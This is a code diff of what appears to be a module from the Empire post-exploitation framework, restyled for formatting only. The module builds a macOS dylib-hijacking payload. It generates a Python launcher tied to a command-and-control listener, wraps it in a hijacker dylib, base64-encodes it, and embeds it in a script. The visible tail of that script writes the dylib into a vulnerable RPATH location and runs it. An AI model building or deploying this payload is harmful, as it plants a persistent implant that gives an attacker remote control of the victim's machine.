@@ -1,13 +1,19 @@
 import base64
 from builtins import object
-from typing import Dict, Tuple, Optional
+from typing import Dict, Optional, Tuple
 
 from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ) -> Tuple[Optional[str], Optional[str]]:
 
         # the Python script itself, with the command to invoke
         #   for execution appended to the end. Scripts should output
@@ -15,16 +21,23 @@ class Module(object):
         #
         # the script should be stripped of comments, with a link to any
         #   original reference script included in the comments.
-        listener_name = params['Listener']
-        user_agent = params['UserAgent']
-        safe_checks = params['SafeChecks']
-        arch = params['Arch']
-        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
-        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
-        dylib_bytes = main_menu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
+        listener_name = params["Listener"]
+        user_agent = params["UserAgent"]
+        safe_checks = params["SafeChecks"]
+        arch = params["Arch"]
+        launcher = main_menu.stagers.generate_launcher(
+            listener_name,
+            language="python",
+            userAgent=user_agent,
+            safeChecks=safe_checks,
+        )
+        launcher = launcher.strip("echo").strip(" | python3 &").strip('"')
+        dylib_bytes = main_menu.stagers.generate_dylib(
+            launcherCode=launcher, arch=arch, hijacker="true"
+        )
         encoded_dylib = base64.b64encode(dylib_bytes)
-        dylib = params['LegitimateDylibPath']
-        vrpath = params['VulnerableRPATH']
+        dylib = params["LegitimateDylibPath"]
+        vrpath = params["VulnerableRPATH"]
 
         script = """
 from ctypes import *
@@ -460,6 +473,10 @@ temp = open(path,'wb')
 temp.write(decodedDylib)
 temp.close()
 run(path)
-""" % (dylib,vrpath,encoded_dylib)
+""" % (
+            dylib,
+            vrpath,
+            encoded_dylib,
+        )
 
         return script
